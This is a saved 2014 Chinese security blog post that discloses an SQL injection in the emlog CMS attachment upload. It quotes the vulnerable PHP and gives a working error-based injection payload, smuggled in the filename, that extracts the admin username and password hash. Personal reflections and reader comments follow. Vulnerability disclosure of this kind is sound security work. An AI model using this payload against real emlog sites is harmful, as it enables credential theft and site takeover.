@@ -1,0 +1,530 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>emlog后台作者权限SQL注入 | 离别歌</title>
+<link href="./emlog后台作者权限SQL注入  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/styles.css" rel="stylesheet"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/style.css" rel="stylesheet"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./emlog后台作者权限SQL注入  离别歌/jquery.min.js"></script>
+<link href="./emlog后台作者权限SQL注入  离别歌/code.css" rel="stylesheet"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/button.css" rel="stylesheet"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./emlog后台作者权限SQL注入  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;text=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;title=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;is_video=false&amp;description=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;title=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;title=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;title=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;title=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html&amp;name=emlog%E5%90%8E%E5%8F%B0%E4%BD%9C%E8%80%85%E6%9D%83%E9%99%90SQL%E6%B3%A8%E5%85%A5&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">emlog后台作者权限SQL注入</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年2月25日 18:01" itemprop="datePublished">
+                    2014 二月 25 18:01
+                </time>
+</div>
+<div class="article-tag">
+            阅读：8211
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/emlog">emlog</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+<span style="font-size:14px;">    实话说，以后不想再挖web漏洞了，也不想发这类文章，web的东西搞来搞起就是那个样，我原本就不想深入，想那些大神一样能把一个cms分析得透彻。我有时候只是泛泛地看，泛泛地找一些简单的漏洞，深入又得花不少时间，而且做出的东西也不一定尽如人意。前段时间总有种刷分刷钱的想法，结果后来都是化为泡影，估计也是因为自己对待漏洞的态度不正确，有时候也是受到他人的影响。</span>
+</p>
+<p>
+<span style="font-size:14px;">    前几天某人问到我的一个学长，我才知道有些人虽然不常在网络上出现但实际上真正有实力的人完全不需要混脸熟。曾经我没接触web的时候多么向往去成为一个能写木马的人，也曾经确确实实分析过一段时间的gh0st，写过一些C++程序。</span>
+</p>
+<p>
+<span style="font-size:14px;">    这几天有个朋友在我博客留言问我为什么gh0st的文章不继续写了，我无言以对。自己这么久执迷于python和php，似乎完全忘记自己的初衷。半年前我曾经抱怨自己，学了很多东西但实际上有关安全的知识自己知道的并不多，诸如逆向、免杀、漏洞分析。半年后的我虽然真正去研究起安全（不敢说精通web安全但也对各种web漏洞十分熟悉），但真的像自己想的那样，能成为一个了不起的安全研究者吗。</span>
+</p>
+<p>
+<span style="font-size:14px;">    可能自己的路走偏了，web不是我的方向，我只是为了让自己更快更简单地成为一个所谓的“黑客”才去选择web安全。</span>
+</p>
+<p>
+<span style="font-size:14px;">    我希望自己能在二进制代码与程序的路上，做一名安全研究者，虽然要比web上难走许多。在此之前，我把自己这几天写过的文章发在我博客，以后不想继续了。可能在听到别人说到xxcms注入或getshell的时候还是会心动，但坚持自己的本心，我相信理想一定会实现。</span>
+</p>
+<hr/>
+<p>
+<span style="font-size:14px;">    后台上传附件处，代码在/admin/attachment.php：</span>
+</p>
+<pre class="brush: php;auto-links: false;">//上传附件
+if ($action == 'upload') {
+	$logid = isset($_GET['logid']) ? intval($_GET['logid']) : '';
+	$attach = isset($_FILES['attach']) ? $_FILES['attach'] : '';
+	if ($attach) {
+		for ($i = 0; $i &lt; count($attach['name']); $i++) {
+			if ($attach['error'][$i] != 4) {
+				$isthumbnail = Option::get('isthumbnail') == 'y' ? true : false;
+				$file_info = uploadFile($attach['name'][$i], $attach['error'][$i], $attach['tmp_name'][$i], $attach['size'][$i], Option::getAttType(), false, $isthumbnail);
+				// 写入附件信息
+				$query = "INSERT INTO " . DB_PREFIX . "attachment (blogid, filename, filesize, filepath, addtime, width, height, mimetype, thumfor) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s', 0)";
+				$query = sprintf($query, $logid, $file_info['file_name'], $file_info['size'], $file_info['file_path'], time(), $file_info['width'], $file_info['height'], $file_info['mime_type']);
+				$DB-&gt;query($query);
+				$aid = $DB-&gt;insert_id();
+				$DB-&gt;query("UPDATE " . DB_PREFIX . "blog SET attnum=attnum+1 WHERE gid=$logid");
+				// 写入缩略图信息
+				if (isset($file_info['thum_file'])) {
+					$query = "INSERT INTO " . DB_PREFIX . "attachment (blogid, filename, filesize, filepath, addtime, width, height, mimetype, thumfor) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s','%s')";
+					$query = sprintf($query, $logid, $file_info['file_name'], $file_info['thum_size'], $file_info['thum_file'], time(), $file_info['thum_width'], $file_info['thum_height'], $file_info['mime_type'], $aid);
+					$DB-&gt;query($query);		
+				}
+			}
+		}
+	}
+	emDirect("attachment.php?action=attlib&amp;logid=$logid");
+}</pre>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">接受来的$_FILE变量，直接赋值给$attach 参数。其后调用uploadFile函数上传文件，将上传后的信息赋值给$file_info，而$file_info[‘file_name’]是直接赋值的$attach['name'][$i]。最后将$file_info带入查询，造成了注入。</span><br>
+<br>
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">下面是演示。当你拥有后台作者权限后，登录后台发表文章处，上传一个图片，中途抓包：</span>
+</p>
+<p>
+<span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201402/4efd1393323505.jpg" id="ematt:469" target="_blank"><img alt="01.jpg" border="0" height="70" src="./emlog后台作者权限SQL注入  离别歌/thum-4efd1393323505.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">如图，将filename修改成：</span><br/>
+<span style="font-size:14px;">    </span><strong><span style="font-size:14px;">info',(select 1 from  (select count(*),concat((select concat(username, 0x23, password) from emlog_user limit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)p),'','','0','0','', 0)#.jpg</span></strong><br/>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">一个显错注入。发包以后查看回复包：</span><br/>
+<p>
+<span style="font-size:14px;"></span><span style="font-size:14px;">    </span><a href="https://www.leavesongs.com/content/uploadfile/201402/3fb51393323506.jpg" id="ematt:471" target="_blank"><img alt="02.jpg" border="0" height="161" src="./emlog后台作者权限SQL注入  离别歌/thum-3fb51393323506.jpg" title="点击查看原图" width="650"/></a>
+</p>
+<p>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">如图，可以得到管理员密码的hash。图中显示的不全是因为显错注入显示的长度有限，可以使用mysql的substring函数截取一部分显示，分两次注入完毕。</span><br/>
+<span style="font-size:14px;">    </span><span style="font-size:14px;">需要后台登录，虽然比较鸡肋，但某些emlog用户使用了自助注册等插件导致任何人可以注册成为作者，并轻易获取管理员权限。</span><br/>
+<span style="font-size:14px;"></span>
+</p>
+</p>
+<span id="__kindeditor_bookmark_start_47__" style="display:none;"></span>
+<p>
+<br/>
+</p>
+</br></br></div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2476">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/a928f32a36fc1b7cd1b9348a1f79d8b3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">上善若水</a>
+<time datetime="2016年11月15日 13:41" itemprop="datePublished">
+                            2016 十一月 15 13:41
+                        </time>
+<a href="javascript:reply_to('2476', '上善若水')">回复</a>
+</p>
+<p class="comment-meta">p神现在方向应该很明确了吧。我恰好处在和你当初一样彷徨的阶段。恰好看到了这篇文章。</p>
+</div>
+</div>
+<div class="row" id="comment-2160">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/c02e642db04b9a42e38561dc00f5b0ec.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.tjcaizhuang.com" target="_blank">天津化妆学校</a>
+<time datetime="2015年6月30日 08:53" itemprop="datePublished">
+                            2015 六月 30 08:53
+                        </time>
+<a href="javascript:reply_to('2160', '天津化妆学校')">回复</a>
+</p>
+<p class="comment-meta">不错</p>
+</div>
+</div>
+<div class="row" id="comment-2012">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/3a56ce0535842608fb1745260c5db5e6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.aiyw.net" target="_blank">北京SEO</a>
+<time datetime="2015年4月6日 18:00" itemprop="datePublished">
+                            2015 四月 06 18:00
+                        </time>
+<a href="javascript:reply_to('2012', '北京SEO')">回复</a>
+</p>
+<p class="comment-meta">不错哦</p>
+</div>
+</div>
+<div class="row" id="comment-2010">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/c8dba6205497dd2ab717f38f9717fdc7.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.weilelt.com" target="_blank">微乐论坛</a>
+<time datetime="2015年4月4日 21:08" itemprop="datePublished">
+                            2015 四月 04 21:08
+                        </time>
+<a href="javascript:reply_to('2010', '微乐论坛')">回复</a>
+</p>
+<p class="comment-meta">不错哈朋友</p>
+</div>
+</div>
+<div class="row" id="comment-2000">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/f37545c2683e947ca432a3c22b82a7b8.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.caolianmeng.com" target="_blank">草广告联盟</a>
+<time datetime="2015年3月27日 16:14" itemprop="datePublished">
+                            2015 三月 27 16:14
+                        </time>
+<a href="javascript:reply_to('2000', '草广告联盟')">回复</a>
+</p>
+<p class="comment-meta">支持 呵呵</p>
+</div>
+</div>
+<div class="row" id="comment-1983">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/c8dba6205497dd2ab717f38f9717fdc7.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">微乐怎么注册</a>
+<time datetime="2015年3月22日 20:16" itemprop="datePublished">
+                            2015 三月 22 20:16
+                        </time>
+<a href="javascript:reply_to('1983', '微乐怎么注册')">回复</a>
+</p>
+<p class="comment-meta">不错</p>
+</div>
+</div>
+<div class="row" id="comment-1931">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/db23754bc25cc56d9ead162580fc48c3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.banshouseo.com" target="_blank">站长工具</a>
+<time datetime="2015年2月5日 20:50" itemprop="datePublished">
+                            2015 二月 05 20:50
+                        </time>
+<a href="javascript:reply_to('1931', '站长工具')">回复</a>
+</p>
+<p class="comment-meta">很好用啊</p>
+</div>
+</div>
+<div class="row" id="comment-1629">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/32f884482f7c767fa1ba5944e1ca6c3a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.qwang.cn" target="_blank">假日生活指南</a>
+<time datetime="2014年5月12日 14:10" itemprop="datePublished">
+                            2014 五月 12 14:10
+                        </time>
+<a href="javascript:reply_to('1629', '假日生活指南')">回复</a>
+</p>
+<p class="comment-meta">真棒的家伙</p>
+</div>
+</div>
+<div class="row" id="comment-1612">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/b600284a5061ae933f66b7804194aa31.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">七哥</a>
+<time datetime="2014年4月21日 01:20" itemprop="datePublished">
+                            2014 四月 21 01:20
+                        </time>
+<a href="javascript:reply_to('1612', '七哥')">回复</a>
+</p>
+<p class="comment-meta">支持博主。。。想做就去做吧</p>
+</div>
+</div>
+<div class="row" id="comment-1610">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/8af258ecd81c5c7471c1664af611f531.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://xn--im-5y2d.cn" target="_blank">im帥</a>
+<time datetime="2014年4月18日 23:42" itemprop="datePublished">
+                            2014 四月 18 23:42
+                        </time>
+<a href="javascript:reply_to('1610', 'im帥')">回复</a>
+</p>
+<p class="comment-meta">博主和我差不多，但是我更水一点，工程类专业的计算机技术爱好者（会装系统）：) <br/><br/>其实我还是支持博主做开发的，虽然Web是主流，但是却不可能完全离开本地客户端。<br/><br/>另外，老狼那套教程貌似不太完整啊  ;p</p>
+</div>
+</div>
+<div class="row" id="comment-1596">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/cc2827ec51c772de854813414416e971.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.yptk.cn/" target="_blank">云破天开</a>
+<time datetime="2014年4月5日 10:45" itemprop="datePublished">
+                            2014 四月 05 10:45
+                        </time>
+<a href="javascript:reply_to('1596', '云破天开')">回复</a>
+</p>
+<p class="comment-meta">终于找到研究EMlog的了，加油</p>
+</div>
+</div>
+<div class="row" id="comment-1592">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/f337f9a6d27c8fe4e531f5705b9df954.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://likinming.com" target="_blank">李明</a>
+<time datetime="2014年4月1日 20:59" itemprop="datePublished">
+                            2014 四月 01 20:59
+                        </time>
+<a href="javascript:reply_to('1592', '李明')">回复</a>
+</p>
+<p class="comment-meta">其实做什么沒关系的,最重要是自己喜欢,做得开心就行了。</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1593">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年4月1日 21:00" itemprop="datePublished">
+                            2014 四月 01 21:00
+                        </time>
+<a href="javascript:reply_to('1593', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@李明：是呀，现在已经好多了。合理分配一下自己的时间就好了。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1591">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/642e38a199818aa2c0b09d255d79d438.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">音货得福</a>
+<time datetime="2014年4月1日 20:51" itemprop="datePublished">
+                            2014 四月 01 20:51
+                        </time>
+<a href="javascript:reply_to('1591', '音货得福')">回复</a>
+</p>
+<p class="comment-meta">作为一个小白,先以您为榜样,好好学习</p>
+</div>
+</div>
+<div class="row" id="comment-1554">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/bf3e12b8a4ef09f73d485e71be0f0ddc.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.malaboke.com/bokehutui" target="_blank">博客互推联盟</a>
+<time datetime="2014年2月27日 14:06" itemprop="datePublished">
+                            2014 二月 27 14:06
+                        </time>
+<a href="javascript:reply_to('1554', '博客互推联盟')">回复</a>
+</p>
+<p class="comment-meta">看到博主分享这么多内容，特别想把这些内容让更多博友看到，如果博主能够经常跟其他博友互动，希望博主能够加入到“博客互推联盟”，这里有很多很勤奋的博友，和您一样，每天在坚持为大家分享好的内容。<br/>在这个互联网快速变革的时代，我们还在坚持，但我们不想孤军奋战，让更多博友看到你，让我们彼此多一点交流，一起发展。</p>
+</div>
+</div>
+<div class="row" id="comment-1550">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/7aaefa74d2a36400f8c7133b0d23d987.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.hehe.com" target="_blank">hehe</a>
+<time datetime="2014年2月27日 09:23" itemprop="datePublished">
+                            2014 二月 27 09:23
+                        </time>
+<a href="javascript:reply_to('1550', 'hehe')">回复</a>
+</p>
+<p class="comment-meta">lz 别闹了 你去发展Bin 呵呵未来都是云趋势 B/S 架构<br/> 除非你能挖浏览器漏洞 那么一切都是浮云<br/>有多少人重视客户端漏洞呢 <br/>你问问袁哥 国内有多少能挖内核级漏洞的 多少企业愿意买单<br/>想一套做一套永远都得不到</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1551">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年2月27日 13:19" itemprop="datePublished">
+                            2014 二月 27 13:19
+                        </time>
+<a href="javascript:reply_to('1551', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@hehe：你误会了，我想我更喜欢做开发<br/>漏洞挖掘的话只是开发的辅助<br/>做底层的开发，我还是想多了解一些漏洞、免杀相关的东西<br/>不是为了挖漏洞而学bin</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1557">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/7aaefa74d2a36400f8c7133b0d23d987.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.hehe.com" target="_blank">hehe</a>
+<time datetime="2014年2月27日 21:38" itemprop="datePublished">
+                            2014 二月 27 21:38
+                        </time>
+<a href="javascript:reply_to('1557', 'hehe')">回复</a>
+</p>
+<p class="comment-meta">@phithon：将来客户端全部转移云平台处理 <br/>比如现在不用播放器用迅雷云了<br/>比如 Chrome OS <br/>那你的开发又是什么呢<br/>本地端溢出了又如何呢<br/>我只是想说这是一条没有结束又即将结束的旅程<br/>放下一切寻找新世界的旅行 如同亚历山大大帝与海<br/>不过是地球上在不起眼的点 渺小而且无力</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1558">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./emlog后台作者权限SQL注入  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年2月27日 21:56" itemprop="datePublished">
+                            2014 二月 27 21:56
+                        </time>
+<a href="javascript:reply_to('1558', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@hehe：我想的话，当然安全类的软件也会向云的方向发展<br/>这个我暂时不敢预测<br/>我不是说自己做底层就是底层到溢出或汇编什么的，只是大概到C语言这一层吧<br/>然后我还想做一些安全类的应用软件，也是为了渗透服务<br/>一些木马、僵尸网络也许也会向云的方向发展。自己了解的也不多。<br/>你说的挺好的，我希望我的方向也要和网络有关，不可能抛弃网络仅仅去做一个播放器或word的溢出什么的。</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="96b50ada0911f2c3759d64b785eb5743c584b7ee"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./emlog后台作者权限SQL注入  离别歌/96b50ada0911f2c3759d64b785eb5743c584b7ee"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="308">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="Q9GARqiuWmiUnuziTBGJxRccSQVQqWeHot16FUuJn9cjn9XxHSat6veh1UoY9q3R"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./emlog后台作者权限SQL注入  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./emlog后台作者权限SQL注入  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
